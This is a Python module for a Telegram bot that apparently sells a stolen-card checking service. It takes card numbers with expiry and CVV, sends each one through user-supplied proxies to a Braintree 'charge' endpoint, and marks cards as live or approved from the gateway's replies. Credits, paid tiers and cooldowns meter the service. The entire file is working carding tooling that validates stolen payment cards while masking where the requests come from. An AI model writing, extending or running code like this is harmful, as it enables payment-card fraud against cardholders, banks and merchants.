# gates/b3_charge.py
import re
import asyncio
import aiohttp
import time
import logging
import html
from html import escape

from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

from db import get_user, update_user
from bin import get_bin_info
from utils.credits import consume_credit
from utils.bullet import get_developer_mention, get_user_mention
from force_join import force_join
from config import OWNER_ID, ADMIN_IDS
from proxy import get_user_proxies_from_db   # 👈 प्रॉक्सी इंपोर्ट

logger = logging.getLogger(__name__)

# === CONFIG ===
B3_CHARGE_API = "ta="

# === CARD PATTERN ===
CARD_PATTERN = re.compile(
    r"\b(\d{12,19})[\|/: ]+(\d{1,2})[\|/: ]+(\d{2,4})[\|/: ]+(\d{3,4})\b"
)

# === EMOJI IDs ===
EMOJI_LOADING = '5195033767969839232'   # ⏳
EMOJI_SUCCESS = '5323307196807653127'   # ✅
EMOJI_ERROR = '5323535839391653590'     # ❌
EMOJI_DEAD = '5210952531676504517'      # ❌
EMOJI_CHARGED = '5852881749645728848'   # 💎

# === COOLDOWN TRACKING (per user) ===
user_bc_count = {}      # यूजर ने कितने CC चेक किए (लगातार)
user_last_bc_time = {}  # आखिरी बार कोल्डाउन कब लगा

async def get_user_tier(user_id: int) -> str:
    """Get user tier for cooldown"""
    if user_id == OWNER_ID:
        return "owner"
    if user_id in ADMIN_IDS:
        return "admin"
    
    try:
        user_data = await get_user(user_id)
        if not user_data:
            return "free"
        plan = str(user_data.get('plan', '')).lower()
        if any(p in plan for p in ['premium', 'plus', 'prime', 'trial']):
            return "premium"
        return "free"
    except:
        return "free"

async def enforce_bc_cooldown(user_id: int, update: Update) -> bool:
    """
    Enforce tier-based cooldown:
    - Free: 2 CC ke baad 30s ka timer
    - Premium: 2 CC ke baad 15s ka timer
    - Admin/Owner: No cooldown
    """
    tier = await get_user_tier(user_id)
    
    # No cooldown for owner/admin
    if tier in ["owner", "admin"]:
        return True
    
    # Get current count and last cooldown time
    count = user_bc_count.get(user_id, 0)
    last_time = user_last_bc_time.get(user_id, 0)
    current_time = time.time()
    
    # Set cooldown seconds based on tier
    cooldown_seconds = 15 if tier == "premium" else 30
    
    # Agar 2 CC complete ho gaye hain to timer check karo
    if count >= 2:
        time_since_last = current_time - last_time
        if time_since_last < cooldown_seconds:
            remaining = round(cooldown_seconds - time_since_last, 1)
            await update.message.reply_text(
                f"<tg-emoji emoji-id='{EMOJI_LOADING}'>⏳</tg-emoji> "
                f"<b>Cooldown ({tier.upper()})</b>\n"
                f"You've checked 2 cards. Please wait <code>{remaining}s</code> before next check.",
                parse_mode=ParseMode.HTML
            )
            return False
        else:
            # Cooldown khatam, reset count
            user_bc_count[user_id] = 0
            user_last_bc_time[user_id] = 0
    
    return True

def update_bc_count(user_id: int):
    """Increment CC check count and set last cooldown time if limit reached"""
    count = user_bc_count.get(user_id, 0) + 1
    user_bc_count[user_id] = count
    
    # Agar 2 CC check ho gaye to cooldown time set karo
    if count >= 2:
        user_last_bc_time[user_id] = time.time()

async def fetch_b3_response(session: aiohttp.ClientSession, card: str, proxy: str = None) -> dict:
    """Fetch response from B3 API with optional proxy"""
    try:
        url = B3_CHARGE_API + card
        if proxy:
            # प्रॉक्सी को URL में जोड़ो (पहले से एन्कोडेड होना चाहिए)
            import urllib.parse
            encoded_proxy = urllib.parse.quote(proxy)
            url += f"&proxy={encoded_proxy}"
        
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=60)) as resp:
            if resp.status != 200:
                return {"response": f"HTTP {resp.status}", "status": "Error"}
            text = await resp.text()
            import json
            try:
                return json.loads(text)
            except:
                # Plain text fallback
                if "Card Issuer Declined CVV" in text:
                    return {"response": "Card Issuer Declined CVV", "status": "Live"}
                elif "Insufficient Funds" in text:
                    return {"response": "Insufficient Funds", "status": "Live"}
                elif "Payment successful" in text:
                    return {"response": "Payment successful", "status": "Charged"}
                elif "No Account" in text:
                    return {"response": "No Account", "status": "Declined"}
                return {"response": text[:100], "status": "Unknown"}
    except asyncio.TimeoutError:
        return {"response": "Timeout (60s)", "status": "Error"}
    except Exception as e:
        return {"response": str(e)[:100], "status": "Error"}

async def pin_message_for_user(bot, chat_id: int, message_id: int):
    """Pin a message in user's chat"""
    try:
        await bot.pin_chat_message(chat_id=chat_id, message_id=message_id, disable_notification=True)
        logger.info(f"Pinned message {message_id} in chat {chat_id}")
    except Exception as e:
        logger.warning(f"Failed to pin message: {e}")

# ===== B3 CHARGE (/bc) =====
async def process_bc(update: Update, context: ContextTypes.DEFAULT_TYPE, payload: str):
    start_time = time.time()
    msg = None
    user = update.effective_user
    bot = context.bot

    try:
        # Processing message
        processing_text = (
            f'<tg-emoji emoji-id="{EMOJI_LOADING}">⏳</tg-emoji> '
            '𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜 𝘽3 𝘾𝙝𝙖𝙧𝙜𝙚...\n'
            f'<code>{escape(payload)}</code>'
        )
        msg = await update.message.reply_text(processing_text, parse_mode=ParseMode.HTML)

        # Credit check
        if not await consume_credit(user.id):
            await msg.edit_text("❌ No credits left")
            return

        # 👇 प्रॉक्सी चेक करो
        user_proxies = await get_user_proxies_from_db(user.id)
        if not user_proxies:
            await msg.edit_text(
                "❌ <b>No proxies found!</b>\n\n"
                "Please add at least one proxy using <code>/addpxy</code> before using /bc.",
                parse_mode=ParseMode.HTML
            )
            return
        
        # पहली प्रॉक्सी ले लो (या तुम चाहो तो रैंडम ले सकते हो)
        selected_proxy = user_proxies[0]

        # API Call with retry for "No Account"
        async with aiohttp.ClientSession() as session:
            data = await fetch_b3_response(session, payload, selected_proxy)
            
            # 👇 Retry once if "No Account" (wait 5 seconds)
            if data.get("response") == "No Account" and data.get("status") == "Declined":
                await asyncio.sleep(5)
                data = await fetch_b3_response(session, payload, selected_proxy)

        # Extract ONLY response field
        response_text = data.get("response", "No response")

        # BIN Lookup
        try:
            bin_number = payload.split("|")[0][:6]
            bin_details = await get_bin_info(bin_number) or {}
            brand = (bin_details.get("scheme") or "N/A").upper()
            type_ = (bin_details.get("type") or "N/A").upper()
            level = (bin_details.get("brand") or "N/A").upper()
            issuer = bin_details.get("bank", "N/A")
            country = bin_details.get("country", "Unknown")
            flag = bin_details.get("country_emoji", "")
        except:
            brand = type_ = level = issuer = "N/A"
            country = "Unknown"
            flag = ""

        # Determine Header Status
        response_lower = response_text.lower()
        
        if "payment successful" in response_lower:
            status_text = '𝑨𝒑𝒑𝒓𝒐𝒗𝒆𝒅 <tg-emoji emoji-id="5870702999180942496">💎</tg-emoji>'
            is_approved = True
        elif "insufficient funds" in response_lower or "card issuer declined cvv" in response_lower:
            status_text = '𝑨𝒑𝒑𝒓𝒐𝒗𝒆𝒅 <tg-emoji emoji-id="5870702999180942496">💎</tg-emoji>'
            is_approved = True
        else:
            status_text = '𝑫𝒆𝒄𝒍𝒊𝒏𝒆𝒅 <tg-emoji emoji-id="5855085385696156087">💎</tg-emoji>'
            is_approved = False

        elapsed = round(time.time() - start_time, 2)

        owner_mention = get_developer_mention()
        user_mention = get_user_mention(user)

        # Final message
        final_text = (
            f'[<tg-emoji emoji-id="5125437164422694571">💎</tg-emoji>] <b><i>Card</i></b> ➜ <code>{html.escape(payload)}</code>\n'
            f'━━━━━━━━━━━\n'
            f'[ﾒ] <b><i>Status</i></b> ➜ {status_text}\n'
            f'[ﾒ] <b><i>Response</i></b> ➜ <b><i>{html.escape(response_text)}</i></b>\n'
            f'[ﾒ] <b><i>Gateway</i></b> ➜ <b><i>Braintree Charge</i></b>\n'
            f'━━━━━━━━━━━\n'
            f'[ﾒ] <b><i>Info</i></b> ➜ <b><i>{html.escape(brand)} - {html.escape(type_)} - {html.escape(level)}</i></b>\n'
            f'[ﾒ] <b><i>Bank</i></b> ➜ <b><i>{html.escape(issuer)}</i></b>\n'
            f'[ﾒ] <b><i>Country</i></b> ➜ <b><i>{html.escape(country)} {html.escape(flag)}</i></b>\n'
            f'━━━━━━━━━━━\n'
            f'[<tg-emoji emoji-id="5134452506935427991">💎</tg-emoji>] <b><i>Checked By</i></b> ➜ {user_mention}\n'
            f'[<tg-emoji emoji-id="5852557780262592341">💎</tg-emoji>] <b><i>Dev</i></b> ➜ {owner_mention}'
        )

        await msg.edit_text(final_text, parse_mode=ParseMode.HTML)
        
        # 👇 Pin message if approved/charged/live
        if is_approved:
            await pin_message_for_user(bot, update.effective_chat.id, msg.message_id)

        # 👇 Cooldown count update (successful check)
        update_bc_count(user.id)

    except Exception as e:
        logger.exception("Error in /bc")
        try:
            if msg:
                await msg.edit_text(f"❌ Error: {escape(str(e))}")
        except:
            pass

@force_join
async def bc_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    # 👇 Enforce tier-based cooldown (2 CC ke baad)
    if not await enforce_bc_cooldown(user.id, update):
        return

    card_input = None

    if context.args:
        raw_text = " ".join(context.args).strip()
        match = CARD_PATTERN.search(raw_text)
        if match:
            card_input = match.groups()

    elif update.message.reply_to_message and update.message.reply_to_message.text:
        match = CARD_PATTERN.search(update.message.reply_to_message.text)
        if match:
            card_input = match.groups()

    if not card_input:
        await update.message.reply_text(
            "⚠️ Usage: <code>/bc card|mm|yy|cvv</code>",
            parse_mode=ParseMode.HTML
        )
        return

    card, mm, yy, cvv = card_input
    mm = mm.zfill(2)
    yy = yy[-2:] if len(yy) == 4 else yy
    payload = f"{card}|{mm}|{yy}|{cvv}"

    asyncio.create_task(process_bc(update, context, payload))
